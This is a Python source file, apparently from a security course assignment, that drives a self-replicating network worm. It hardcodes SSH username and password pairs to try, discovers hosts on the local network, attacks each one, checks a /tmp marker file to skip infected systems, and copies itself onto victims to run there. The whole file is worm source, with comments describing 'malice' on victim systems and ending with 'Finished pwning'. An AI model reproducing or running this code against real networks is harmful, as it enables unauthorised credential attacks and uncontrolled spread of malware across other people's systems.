import sys

from Replicator import Replicator

DEBUG = True

try:
	dprint
except:
	def dprint(msg, debug=True):
		if debug:
			print(msg)

def main(argv):

	# The list of credentials to attempt
	credList = [
		('cpsc', 'cpsc'),
		('hello', 'world'),
		('hello1', 'world'),
		('root', '#Gig#'),
	]

	myReplicator = Replicator(credList)

	isHost = True

	# If we are being run without a command line parameters,
	# then we assume we are executing on a victim system and
	# will act maliciously. This way, when you initially run the
	# worm on the origin system, you can simply give it some command
	# line parameters so the worm knows not to act maliciously
	# on attackers system. If you do not like this approach,
	# an alternative approach is to hardcode the origin system's
	# IP address and have the worm check the IP of the current
	# system against the hardcoded IP.
	if len(argv) < 1:

		dprint("Running on victim system...", DEBUG)

		isHost = False

		# TODO: If we are running on the victim, check if
		# the victim was already infected. If so, terminate.
		# Otherwise, proceed with malice.
		if Replicator.isInfectedSystem():
			dprint("Victim system is already infected. Terminate", DEBUG)
			sys.exit(0)

	if isHost:
		Replicator.markAsHost()

	# Get the IP of the current system
	currentIp = Replicator.getMyIP('eth2')
	dprint("Current IP: " + currentIp, DEBUG)

	# Get the hosts on the same network
	networkHosts = Replicator.getHostsOnTheSameNetwork()

	# Remove the IP of the current system
	# from the list of discovered systems (we
	# do not want to target ourselves!).
	if currentIp in networkHosts:
		networkHosts.remove(currentIp)

	dprint("Found hosts: %s" % str(networkHosts), DEBUG)

	# Go through the network hosts
	for host in networkHosts:

		dprint("### Probing " + host + " ###", DEBUG)

		# Try to attack this host
		sshInfo, sshClient =  myReplicator.attackSystem(host)

		dprint("Final assessment: " + Replicator.desc(sshInfo), DEBUG)

		# Did the attack succeed?
		if sshInfo == Replicator.SUCCESSFUL_CONNECTION:

			dprint("Trying to spread...", DEBUG)

			# TODO: Check if the system was
			# already infected. This can be
			# done by checking whether the
			# remote system contains /tmp/infected.txt
			# file (which the worm will place there
			# when it first infects the system)
			# This can be done using code similar to
			# the code below:
			# try:
			#		remotepath = '/tmp/infected.txt'
			#		localpath = '/home/cpsc/'
			#	 # Copy the file from the specified
			#	 # remote path to the specified
			# 	 # local path. If the file does exist
			#	 # at the remote path, then get()
			# 	 # will throw IOError exception
			# 	 # (that is, we know the system is
			# 	 # not yet infected).
			#
			#        sftp.get(filepath, localpath)
			# except IOError:
			#       print "This system should be infected"
			#
			#
			# If the system was already infected proceed.
			# Otherwise, infect the system and terminate.
			# Infect that system

			if not myReplicator.remoteSystemIsHost():
				if not myReplicator.remoteSystemIsInfected():
					dprint(host + " is not infected yet", DEBUG)
					myReplicator.spreadAndExecute(isHost)
					Replicator.markInfected()
				else:
					dprint(host + " is already infected yet", DEBUG)
			else:
				dprint("Remote system is host, cancel the attack", DEBUG)


			dprint("Spreading complete", DEBUG)

	dprint("Finished pwning...")
	sys.exit(0)
	
if __name__ == "__main__":
	main(sys.argv[1:])
